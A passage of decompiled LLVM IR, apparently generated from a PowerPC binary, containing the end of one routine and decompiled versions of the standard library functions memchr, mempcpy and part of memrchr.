  %tmp = icmp ult i32 %v1_1000d464, 4
  br i1 %tmp, label %dec_label_pc_1000d47c, label %dec_label_pc_1000d470

dec_label_pc_1000d470:                            ; preds = %dec_label_pc_1000d464
  %v0_1000d470 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d470 = add i32 %v0_1000d470, -4
  %v2_1000d470 = inttoptr i32 %v1_1000d470 to i32*
  %v3_1000d470 = load i32, i32* %v2_1000d470, align 4
  store i32 %v1_1000d470, i32* %r4.global-to-local, align 4
  %v1_1000d474 = add nsw i32 %v1_1000d464, -4
  store i32 %v1_1000d474, i32* %r5.global-to-local, align 4
  %v1_1000d478 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d478 = add i32 %v1_1000d478, -4
  %v3_1000d478 = inttoptr i32 %v2_1000d478 to i32*
  store i32 %v3_1000d470, i32* %v3_1000d478, align 4
  store i32 %v2_1000d478, i32* %r10.global-to-local, align 4
  %v0_1000d47c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d47c

dec_label_pc_1000d47c:                            ; preds = %dec_label_pc_1000d464, %dec_label_pc_1000d470
  %v0_1000d484 = phi i32 [ %v1_1000d464, %dec_label_pc_1000d464 ], [ %v0_1000d47c.pre, %dec_label_pc_1000d470 ]
  %v3_1000d47c = icmp eq i32 %v0_1000d484, 0
  br i1 %v3_1000d47c, label %dec_label_pc_1000d4bc, label %dec_label_pc_1000d484

dec_label_pc_1000d484:                            ; preds = %dec_label_pc_1000d47c
  store i32 %v0_1000d484, i32* %ctr.global-to-local, align 4
  %v2_1000d48c.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d488

dec_label_pc_1000d488:                            ; preds = %dec_label_pc_1000d488, %dec_label_pc_1000d484
  %v2_1000d48c = phi i32 [ %v3_1000d48c, %dec_label_pc_1000d488 ], [ %v2_1000d48c.pre, %dec_label_pc_1000d484 ]
  %v0_1000d488 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d488 = add i32 %v0_1000d488, -1
  %v2_1000d488 = inttoptr i32 %v1_1000d488 to i8*
  %v3_1000d488 = load i8, i8* %v2_1000d488, align 1
  store i32 %v1_1000d488, i32* %r4.global-to-local, align 4
  %v3_1000d48c = add i32 %v2_1000d48c, -1
  %v4_1000d48c = inttoptr i32 %v3_1000d48c to i8*
  store i8 %v3_1000d488, i8* %v4_1000d48c, align 1
  store i32 %v3_1000d48c, i32* %r10.global-to-local, align 4
  %v0_1000d490 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d490 = add i32 %v0_1000d490, -1
  store i32 %v1_1000d490, i32* %ctr.global-to-local, align 4
  %v2_1000d490 = icmp eq i32 %v1_1000d490, 0
  br i1 %v2_1000d490, label %dec_label_pc_1000d4bc, label %dec_label_pc_1000d488

dec_label_pc_1000d498:                            ; preds = %dec_label_pc_1000d444
  %v1_1000d498 = sub nsw i32 4, %v1_1000d444
  store i32 %v1_1000d498, i32* %ctr.global-to-local, align 4
  %v2_1000d4a0 = sub i32 %v1_1000d438, %v1_1000d498
  store i32 %v2_1000d4a0, i32* @r11, align 4
  %v1_1000d4a49 = add i32 %v2_1000d438, -1
  %v2_1000d4a410 = inttoptr i32 %v1_1000d4a49 to i8*
  %v3_1000d4a411 = load i8, i8* %v2_1000d4a410, align 1
  store i32 %v1_1000d4a49, i32* %r4.global-to-local, align 4
  %v3_1000d4a813 = add i32 %v2_1000d43c, -1
  %v4_1000d4a814 = inttoptr i32 %v3_1000d4a813 to i8*
  store i8 %v3_1000d4a411, i8* %v4_1000d4a814, align 1
  store i32 %v3_1000d4a813, i32* %r10.global-to-local, align 4
  %v0_1000d4ac15 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d4ac16 = add i32 %v0_1000d4ac15, -1
  store i32 %v1_1000d4ac16, i32* %ctr.global-to-local, align 4
  %v2_1000d4ac17 = icmp eq i32 %v1_1000d4ac16, 0
  br i1 %v2_1000d4ac17, label %dec_label_pc_1000d4b0, label %dec_label_pc_1000d4a4.dec_label_pc_1000d4a4_crit_edge

dec_label_pc_1000d4a4.dec_label_pc_1000d4a4_crit_edge: ; preds = %dec_label_pc_1000d498, %dec_label_pc_1000d4a4.dec_label_pc_1000d4a4_crit_edge
  %v3_1000d4a818 = phi i32 [ %v3_1000d4a8, %dec_label_pc_1000d4a4.dec_label_pc_1000d4a4_crit_edge ], [ %v3_1000d4a813, %dec_label_pc_1000d498 ]
  %v0_1000d4a4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d4a4 = add i32 %v0_1000d4a4.pre, -1
  %v2_1000d4a4 = inttoptr i32 %v1_1000d4a4 to i8*
  %v3_1000d4a4 = load i8, i8* %v2_1000d4a4, align 1
  store i32 %v1_1000d4a4, i32* %r4.global-to-local, align 4
  %v3_1000d4a8 = add i32 %v3_1000d4a818, -1
  %v4_1000d4a8 = inttoptr i32 %v3_1000d4a8 to i8*
  store i8 %v3_1000d4a4, i8* %v4_1000d4a8, align 1
  store i32 %v3_1000d4a8, i32* %r10.global-to-local, align 4
  %v0_1000d4ac = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d4ac = add i32 %v0_1000d4ac, -1
  store i32 %v1_1000d4ac, i32* %ctr.global-to-local, align 4
  %v2_1000d4ac = icmp eq i32 %v1_1000d4ac, 0
  br i1 %v2_1000d4ac, label %dec_label_pc_1000d4b0, label %dec_label_pc_1000d4a4.dec_label_pc_1000d4a4_crit_edge

dec_label_pc_1000d4b0:                            ; preds = %dec_label_pc_1000d4a4.dec_label_pc_1000d4a4_crit_edge, %dec_label_pc_1000d498
  %v0_1000d4b0 = load i32, i32* @r11, align 4
  %v1_1000d4b0 = call i32 @__asm_rlwinm.(i32 %v0_1000d4b0, i32 29, i32 3, i32 31)
  store i32 %v1_1000d4b0, i32* %r9.global-to-local, align 4
  %v4_1000d4b0 = icmp eq i32 %v1_1000d4b0, 0
  br i1 %v4_1000d4b0, label %dec_label_pc_1000d464, label %dec_label_pc_1000d4b0.dec_label_pc_1000d44c_crit_edge

dec_label_pc_1000d4b0.dec_label_pc_1000d44c_crit_edge: ; preds = %dec_label_pc_1000d4b0
  %v1_1000d458.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d44c

dec_label_pc_1000d4bc:                            ; preds = %dec_label_pc_1000d488, %dec_label_pc_1000d47c
  %v0_1000d4bc = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_1000d4bc

; uselistorder directives
  uselistorder i32 %v1_1000d4b0, { 1, 2, 0 }
  uselistorder i32 %v1_1000d4ac, { 1, 0 }
  uselistorder i32 %v3_1000d4a8, { 1, 2, 0 }
  uselistorder i32 %v1_1000d490, { 1, 0 }
  uselistorder i32 %v3_1000d48c, { 1, 2, 0 }
  uselistorder i32 %v1_1000d464, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000d460, { 1, 0 }
  uselistorder i32 %v2_1000d45c, { 1, 2, 0 }
  uselistorder i32 %v1_1000d444, { 1, 0 }
  uselistorder i32 %v2_1000d43c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000d438, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 0, 3, 6, 4, 7, 5, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 -8, { 6, 7, 2, 8, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_1000d4a4.dec_label_pc_1000d4a4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d47c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d464, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d434, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1000d4c8 = urem i32 %arg1, 256
  store i32 %v1_1000d4c8, i32* %r4.global-to-local, align 4
  %v0_1000d4e87 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_1000d4ec13 = icmp eq i32 %arg2, 0
  br i1 %v2_1000d4ec13, label %dec_label_pc_1000d4f4, label %dec_label_pc_1000d4f0

dec_label_pc_1000d4d4:                            ; preds = %dec_label_pc_1000d4f0
  %v1_1000d4d4 = inttoptr i32 %v0_1000d4d4 to i8*
  %v2_1000d4d4 = load i8, i8* %v1_1000d4d4, align 1
  %v3_1000d4d4 = zext i8 %v2_1000d4d4 to i32
  %v0_1000d4d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d4d8 = add i32 %v0_1000d4d8, -1
  store i32 %v1_1000d4d8, i32* %r5.global-to-local, align 4
  %v1_1000d4dc = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d4dc = icmp eq i32 %v3_1000d4d4, %v1_1000d4dc
  %v0_1000d4e0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d4dc, i32 %v0_1000d4e0)
  %v0_1000d4e4 = load i32, i32* @r3, align 4
  %v1_1000d4e4 = add i32 %v0_1000d4e4, 1
  store i32 %v1_1000d4e4, i32* @r3, align 4
  %v0_1000d4ec = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d4ec = add i32 %v0_1000d4ec, -1
  store i32 %v1_1000d4ec, i32* %ctr.global-to-local, align 4
  %v2_1000d4ec = icmp eq i32 %v1_1000d4ec, 0
  br i1 %v2_1000d4ec, label %dec_label_pc_1000d4f4.loopexit, label %dec_label_pc_1000d4f0

dec_label_pc_1000d4f0:                            ; preds = %entry, %dec_label_pc_1000d4d4
  %v0_1000d4d4 = phi i32 [ %v1_1000d4e4, %dec_label_pc_1000d4d4 ], [ %v0_1000d4e87, %entry ]
  %v0_1000d4f0.in.in = phi i32 [ %v1_1000d4e4, %dec_label_pc_1000d4d4 ], [ %v0_1000d4e87, %entry ]
  %v0_1000d4f0.in = urem i32 %v0_1000d4f0.in.in, 4
  %v0_1000d4f0 = icmp eq i32 %v0_1000d4f0.in, 0
  br i1 %v0_1000d4f0, label %dec_label_pc_1000d4f4.loopexit, label %dec_label_pc_1000d4d4

dec_label_pc_1000d4f4.loopexit:                   ; preds = %dec_label_pc_1000d4f0, %dec_label_pc_1000d4d4
  %v0_1000d51c16.ph = phi i32 [ %v1_1000d4e4, %dec_label_pc_1000d4d4 ], [ %v0_1000d4d4, %dec_label_pc_1000d4f0 ]
  %v0_1000d4f4.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1000d4f8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d4f4

dec_label_pc_1000d4f4:                            ; preds = %dec_label_pc_1000d4f4.loopexit, %entry
  %v0_1000d4f8 = phi i32 [ 0, %entry ], [ %v0_1000d4f8.pre, %dec_label_pc_1000d4f4.loopexit ]
  %v0_1000d4f4 = phi i32 [ %v1_1000d4c8, %entry ], [ %v0_1000d4f4.pre, %dec_label_pc_1000d4f4.loopexit ]
  %v0_1000d51c16 = phi i32 [ %v0_1000d4e87, %entry ], [ %v0_1000d51c16.ph, %dec_label_pc_1000d4f4.loopexit ]
  %v1_1000d4f4 = mul i32 %v0_1000d4f4, 256
  %v1_1000d4f8 = udiv i32 %v0_1000d4f8, 4
  %v2_1000d4fc = or i32 %v1_1000d4f4, %v0_1000d4f4
  %v1_1000d504 = mul i32 %v2_1000d4fc, 65536
  %v2_1000d510 = or i32 %v1_1000d504, %v2_1000d4fc
  store i32 -2130640640, i32* @r7, align 4
  store i32 %v1_1000d4f8, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000d4f8, 4
  br i1 %tmp, label %dec_label_pc_1000d5a4, label %dec_label_pc_1000d51c

dec_label_pc_1000d51c:                            ; preds = %dec_label_pc_1000d4f4, %dec_label_pc_1000d5a0.backedge
  %v0_1000d5a0 = phi i32 [ %v1_1000d5a0, %dec_label_pc_1000d5a0.backedge ], [ %v1_1000d4f8, %dec_label_pc_1000d4f4 ]
  %v0_1000d524 = phi i32 [ %v1_1000d524, %dec_label_pc_1000d5a0.backedge ], [ %v0_1000d4f8, %dec_label_pc_1000d4f4 ]
  %v0_1000d55c = phi i32 [ %v1_1000d520, %dec_label_pc_1000d5a0.backedge ], [ %v0_1000d51c16, %dec_label_pc_1000d4f4 ]
  %v1_1000d51c = inttoptr i32 %v0_1000d55c to i32*
  %v2_1000d51c = load i32, i32* %v1_1000d51c, align 4
  %v1_1000d520 = add i32 %v0_1000d55c, 4
  store i32 %v1_1000d520, i32* @r3, align 4
  %v1_1000d524 = add i32 %v0_1000d524, -4
  store i32 %v1_1000d524, i32* %r5.global-to-local, align 4
  %v1_1000d528 = add i32 %v0_1000d55c, 1
  %v2_1000d52c = xor i32 %v2_1000d51c, %v2_1000d510
  %v1_1000d534 = add i32 %v2_1000d52c, 2130640639
  %v2_1000d538 = xor i32 %v1_1000d534, %v2_1000d52c
  %v2_1000d53c = and i32 %v2_1000d538, -2130640640
  %v6_1000d53c = icmp eq i32 %v2_1000d53c, -2130640640
  br i1 %v6_1000d53c, label %dec_label_pc_1000d5a0.backedge, label %dec_label_pc_1000d548

dec_label_pc_1000d5a0.backedge:                   ; preds = %dec_label_pc_1000d51c, %dec_label_pc_1000d58c
  %v1_1000d5a0 = add i32 %v0_1000d5a0, -1
  store i32 %v1_1000d5a0, i32* %ctr.global-to-local, align 4
  %v2_1000d5a0 = icmp eq i32 %v1_1000d5a0, 0
  br i1 %v2_1000d5a0, label %dec_label_pc_1000d5a4, label %dec_label_pc_1000d51c

dec_label_pc_1000d548:                            ; preds = %dec_label_pc_1000d51c
  %v2_1000d548 = inttoptr i32 %v0_1000d55c to i8*
  %v3_1000d548 = load i8, i8* %v2_1000d548, align 1
  %v4_1000d548 = zext i8 %v3_1000d548 to i32
  %v1_1000d54c = add i32 %v0_1000d55c, 3
  store i32 %v1_1000d54c, i32* @r8, align 4
  %v1_1000d550 = add i32 %v0_1000d55c, 2
  %v4_1000d554 = icmp eq i32 %v4_1000d548, %v0_1000d4f4
  br i1 %v4_1000d554, label %dec_label_pc_1000d55c, label %dec_label_pc_1000d564

dec_label_pc_1000d55c:                            ; preds = %dec_label_pc_1000d548
  ret i32 %v0_1000d55c

dec_label_pc_1000d564:                            ; preds = %dec_label_pc_1000d548
  %v2_1000d564 = inttoptr i32 %v1_1000d528 to i8*
  %v3_1000d564 = load i8, i8* %v2_1000d564, align 1
  %v4_1000d564 = zext i8 %v3_1000d564 to i32
  %v4_1000d568 = icmp eq i32 %v4_1000d564, %v0_1000d4f4
  br i1 %v4_1000d568, label %dec_label_pc_1000d570, label %dec_label_pc_1000d578

dec_label_pc_1000d570:                            ; preds = %dec_label_pc_1000d564
  ret i32 %v1_1000d528

dec_label_pc_1000d578:                            ; preds = %dec_label_pc_1000d564
  %v2_1000d578 = inttoptr i32 %v1_1000d550 to i8*
  %v3_1000d578 = load i8, i8* %v2_1000d578, align 1
  %v4_1000d578 = zext i8 %v3_1000d578 to i32
  %v4_1000d57c = icmp eq i32 %v4_1000d578, %v0_1000d4f4
  br i1 %v4_1000d57c, label %dec_label_pc_1000d584, label %dec_label_pc_1000d58c

dec_label_pc_1000d584:                            ; preds = %dec_label_pc_1000d578
  ret i32 %v1_1000d550

dec_label_pc_1000d58c:                            ; preds = %dec_label_pc_1000d578
  %v2_1000d58c = inttoptr i32 %v1_1000d54c to i8*
  %v3_1000d58c = load i8, i8* %v2_1000d58c, align 1
  %v4_1000d58c = zext i8 %v3_1000d58c to i32
  %v4_1000d590 = icmp eq i32 %v4_1000d58c, %v0_1000d4f4
  br i1 %v4_1000d590, label %dec_label_pc_1000d598, label %dec_label_pc_1000d5a0.backedge

dec_label_pc_1000d598:                            ; preds = %dec_label_pc_1000d58c
  ret i32 %v1_1000d54c

dec_label_pc_1000d5a4:                            ; preds = %dec_label_pc_1000d5a0.backedge, %dec_label_pc_1000d4f4
  %v0_1000d5b026 = phi i32 [ %v0_1000d51c16, %dec_label_pc_1000d4f4 ], [ %v1_1000d520, %dec_label_pc_1000d5a0.backedge ]
  %v0_1000d5a4 = phi i32 [ %v0_1000d4f8, %dec_label_pc_1000d4f4 ], [ %v1_1000d524, %dec_label_pc_1000d5a0.backedge ]
  %v1_1000d5a4 = add i32 %v0_1000d5a4, 1
  store i32 %v1_1000d5a4, i32* %r5.global-to-local, align 4
  store i32 %v0_1000d5a4, i32* %ctr.global-to-local, align 4
  %v2_1000d5c03 = icmp eq i32 %v0_1000d5a4, 0
  br i1 %v2_1000d5c03, label %dec_label_pc_1000d5c4, label %dec_label_pc_1000d5b0

dec_label_pc_1000d5b0:                            ; preds = %dec_label_pc_1000d5a4, %dec_label_pc_1000d5b0.dec_label_pc_1000d5b0_crit_edge
  %v1_1000d5b4 = phi i32 [ %v1_1000d5b4.pre, %dec_label_pc_1000d5b0.dec_label_pc_1000d5b0_crit_edge ], [ %v0_1000d4f4, %dec_label_pc_1000d5a4 ]
  %v0_1000d5b0 = phi i32 [ %v1_1000d5bc, %dec_label_pc_1000d5b0.dec_label_pc_1000d5b0_crit_edge ], [ %v0_1000d5b026, %dec_label_pc_1000d5a4 ]
  %v1_1000d5b0 = inttoptr i32 %v0_1000d5b0 to i8*
  %v2_1000d5b0 = load i8, i8* %v1_1000d5b0, align 1
  %v3_1000d5b0 = zext i8 %v2_1000d5b0 to i32
  %v4_1000d5b4 = icmp eq i32 %v3_1000d5b0, %v1_1000d5b4
  %v0_1000d5b8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d5b4, i32 %v0_1000d5b8)
  %v0_1000d5bc = load i32, i32* @r3, align 4
  %v1_1000d5bc = add i32 %v0_1000d5bc, 1
  store i32 %v1_1000d5bc, i32* @r3, align 4
  %v0_1000d5c0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d5c0 = add i32 %v0_1000d5c0, -1
  store i32 %v1_1000d5c0, i32* %ctr.global-to-local, align 4
  %v2_1000d5c0 = icmp eq i32 %v1_1000d5c0, 0
  br i1 %v2_1000d5c0, label %dec_label_pc_1000d5c4, label %dec_label_pc_1000d5b0.dec_label_pc_1000d5b0_crit_edge

dec_label_pc_1000d5b0.dec_label_pc_1000d5b0_crit_edge: ; preds = %dec_label_pc_1000d5b0
  %v1_1000d5b4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d5b0

dec_label_pc_1000d5c4:                            ; preds = %dec_label_pc_1000d5b0, %dec_label_pc_1000d5a4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000d5c0, { 1, 0 }
  uselistorder i32 %v1_1000d5bc, { 1, 0 }
  uselistorder i32 %v0_1000d5a4, { 1, 2, 0 }
  uselistorder i32 %v1_1000d5a0, { 2, 1, 0 }
  uselistorder i32 %v1_1000d524, { 0, 2, 1 }
  uselistorder i32 %v1_1000d520, { 0, 2, 1 }
  uselistorder i32 %v0_1000d55c, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_1000d4fc, { 1, 0 }
  uselistorder i32 %v1_1000d4f8, { 1, 0 }
  uselistorder i32 %v0_1000d51c16, { 1, 0 }
  uselistorder i32 %v0_1000d4f4, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_1000d4f8, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1000d4ec, { 1, 0 }
  uselistorder i32 %v1_1000d4e4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000d4e87, { 2, 0, 1 }
  uselistorder i32 %v1_1000d4c8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 5, 6, 1, 7, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d5b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5a0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d51c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d4f0, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268490216, i32* @lr, align 4
  %v0_1000d5e4 = call i32 @memcpy()
  %v0_1000d5ec = load i32, i32* @r28, align 4
  %v1_1000d5ec = load i32, i32* @r29, align 4
  %v2_1000d5ec = add i32 %v1_1000d5ec, %v0_1000d5ec
  ret i32 %v2_1000d5ec
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000d604 = urem i32 %arg2, 256
  store i32 %v1_1000d604, i32* %r4.global-to-local, align 4
  %v2_1000d60c = add i32 %arg3, %arg1
  store i32 %v2_1000d60c, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_1000d62813 = icmp eq i32 %arg3, 0
  br i1 %v2_1000d62813, label %dec_label_pc_1000d630, label %dec_label_pc_1000d62c

dec_label_pc_1000d614:                            ; preds = %dec_label_pc_1000d62c
  %v1_1000d614 = add i32 %v0_1000d614, -1
  %v2_1000d614 = inttoptr i32 %v1_1000d614 to i8*
  %v3_1000d614 = load i8, i8* %v2_1000d614, align 1
  %v4_1000d614 = zext i8 %v3_1000d614 to i32
  store i32 %v1_1000d614, i32* %r3.global-to-local, align 4
  %v0_1000d618 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d618 = add i32 %v0_1000d618, -1
  store i32 %v1_1000d618, i32* %r5.global-to-local, align 4
  %v1_1000d61c = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d61c = icmp eq i32 %v4_1000d614, %v1_1000d61c
  %v0_1000d620 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d61c, i32 %v0_1000d620)
  %v0_1000d624 = load i32, i32* %r3.global-to-local, align 4
  %v0_1000d628 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d628 = add i32 %v0_1000d628, -1
  store i32 %v1_1000d628, i32* %ctr.global-to-local, align 4
  %v2_1000d628 = icmp eq i32 %v1_1000d628, 0
  br i1 %v2_1000d628, label %dec_label_pc_1000d630.loopexit, label %dec_label_pc_1000d62c

dec_label_pc_1000d62c:                            ; preds = %entry, %dec_label_pc_1000d614
  %v0_1000d614 = phi i32 [ %v0_1000d624, %dec_label_pc_1000d614 ], [ %v2_1000d60c, %entry ]
  %v0_1000d62c.in.in = phi i32 [ %v0_1000d624, %dec_label_pc_1000d614 ], [ %v2_1000d60c, %entry ]
  %v0_1000d62c.in = urem i32 %v0_1000d62c.in.in, 4
  %v0_1000d62c = icmp eq i32 %v0_1000d62c.in, 0
  br i1 %v0_1000d62c, label %dec_label_pc_1000d630.loopexit, label %dec_label_pc_1000d614

dec_label_pc_1000d630.loopexit:                   ; preds = %dec_label_pc_1000d62c, %dec_label_pc_1000d614
  %v0_1000d65816.ph = phi i32 [ %v0_1000d624, %dec_label_pc_1000d614 ], [ %v0_1000d614, %dec_label_pc_1000d62c ]
  %v0_1000d630.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1000d634.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d630

dec_label_pc_1000d630:                            ; preds = %dec_label_pc_1000d630.loopexit, %entry
  %v0_1000d634 = phi i32 [ 0, %entry ], [ %v0_1000d634.pre, %dec_label_pc_1000d630.loopexit ]
  %v0_1000d630 = phi i32 [ %v1_1000d604, %entry ], [ %v0_1000d630.pre, %dec_label_pc_1000d630.loopexit ]
  %v0_1000d65816 = phi i32 [ %v2_1000d60c, %entry ], [ %v0_1000d65816.ph, %dec_label_pc_1000d630.loopexit ]
  %v1_1000d630 = mul i32 %v0_1000d630, 256
  %v1_1000d634 = udiv i32 %v0_1000d634, 4
  %v2_1000d638 = or i32 %v1_1000d630, %v0_1000d630
  %v1_1000d640 = mul i32 %v2_1000d638, 65536
  %v2_1000d64c = or i32 %v1_1000d640, %v2_1000d638
  store i32 %v2_1000d64c, i32* @r7, align 4
  store i32 -2130640640, i32* @r8, align 4
  store i32 %v1_1000d634, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000d634, 4
  br i1 %tmp, label %dec_label_pc_1000d6d0, label %dec_label_pc_1000d658

dec_label_pc_1000d658:                            ; preds = %dec_label_pc_1000d630, %dec_label_pc_1000d6cc.backedge.dec_label_pc_1000d658_crit_edge
  %v0_1000d6cc21 = phi i32 [ %v1_1000d6cc, %dec_label_pc_1000d6cc.backedge.dec_label_pc_1000d658_crit_edge ], [ %v1_1000d634, %dec_label_pc_1000d630 ]
  %v0_1000d678 = phi i32 [ %v0_1000d678.pre, %dec_label_pc_1000d6cc.backedge.dec_label_pc_1000d658_crit_edge ], [ -2130640640, %dec_label_pc_1000d630 ]
  %v0_1000d660 = phi i32 [ %v0_1000d660.pre, %dec_label_pc_1000d6cc.backedge.dec_label_pc_1000d658_crit_edge ], [ %v2_1000d64c, %dec_label_pc_1000d630 ]
  %v0_1000d65c = phi i32 [ %v0_1000d65c.pre, %dec_label_pc_1000d6cc.backedge.dec_label_pc_1000d658_crit_edge ], [ %v0_1000d634, %dec_label_pc_1000d630 ]
  %v0_1000d658 = phi i32 [ %v0_1000d658.pre, %dec_label_pc_1000d6cc.backedge.dec_label_pc_1000d658_crit_edge ], [ %v0_1000d65816, %dec_label_pc_1000d630 ]
  %v1_1000d658 = add i32 %v0_1000d658, -4
  %v2_1000d658 = inttoptr i32 %v1_1000d658 to i32*
  %v3_1000d658 = load i32, i32* %v2_1000d658, align 4
  store i32 %v1_1000d658, i32* %r3.global-to-local, align 4
  %v1_1000d65c = add i32 %v0_1000d65c, -4
  store i32 %v1_1000d65c, i32* %r5.global-to-local, align 4
  %v2_1000d660 = xor i32 %v3_1000d658, %v0_1000d660
  %v1_1000d664 = add i32 %v0_1000d658, -3
  %v1_1000d66c = add i32 %v2_1000d660, 2130640639
  %v1_1000d674 = add i32 %v0_1000d658, -2
  %v2_1000d670 = sub i32 -1, %v2_1000d660
  %v2_1000d678 = xor i32 %v1_1000d66c, %v2_1000d670
  %v3_1000d678 = and i32 %v2_1000d678, %v0_1000d678
  %v6_1000d678 = icmp eq i32 %v3_1000d678, 0
  %v1_1000d67c = add i32 %v0_1000d658, -1
  br i1 %v6_1000d678, label %dec_label_pc_1000d6cc.backedge, label %dec_label_pc_1000d684

dec_label_pc_1000d684:                            ; preds = %dec_label_pc_1000d658
  %v2_1000d684 = inttoptr i32 %v1_1000d67c to i8*
  %v3_1000d684 = load i8, i8* %v2_1000d684, align 1
  %v4_1000d684 = zext i8 %v3_1000d684 to i32
  %v1_1000d688 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d688 = icmp eq i32 %v4_1000d684, %v1_1000d688
  br i1 %v4_1000d688, label %dec_label_pc_1000d690, label %dec_label_pc_1000d698

dec_label_pc_1000d690:                            ; preds = %dec_label_pc_1000d684
  store i32 %v1_1000d67c, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000d67c

dec_label_pc_1000d698:                            ; preds = %dec_label_pc_1000d684
  %v2_1000d698 = inttoptr i32 %v1_1000d674 to i8*
  %v3_1000d698 = load i8, i8* %v2_1000d698, align 1
  %v4_1000d698 = zext i8 %v3_1000d698 to i32
  %v4_1000d69c = icmp eq i32 %v4_1000d698, %v1_1000d688
  br i1 %v4_1000d69c, label %dec_label_pc_1000d6a4, label %dec_label_pc_1000d6ac

dec_label_pc_1000d6a4:                            ; preds = %dec_label_pc_1000d698
  store i32 %v1_1000d674, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000d674

dec_label_pc_1000d6ac:                            ; preds = %dec_label_pc_1000d698
  %v2_1000d6ac = inttoptr i32 %v1_1000d664 to i8*
  %v3_1000d6ac = load i8, i8* %v2_1000d6ac, align 1
  %v4_1000d6ac = zext i8 %v3_1000d6ac to i32
  %v4_1000d6b0 = icmp eq i32 %v4_1000d6ac, %v1_1000d688
  br i1 %v4_1000d6b0, label %dec_label_pc_1000d6b8, label %dec_label_pc_1000d6c0

dec_label_pc_1000d6b8:                            ; preds = %dec_label_pc_1000d6ac
  store i32 %v1_1000d664, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000d664

dec_label_pc_1000d6c0:                            ; preds = %dec_label_pc_1000d6ac
  %v1_1000d6c0 = inttoptr i32 %v1_1000d658 to i8*
  %v2_1000d6c0 = load i8, i8* %v1_1000d6c0, align 1
  %v3_1000d6c0 = zext i8 %v2_1000d6c0 to i32
  %v4_1000d6c4 = icmp eq i32 %v3_1000d6c0, %v1_1000d688
  %v0_1000d6c8 = load i32, i32* @lr, align 4
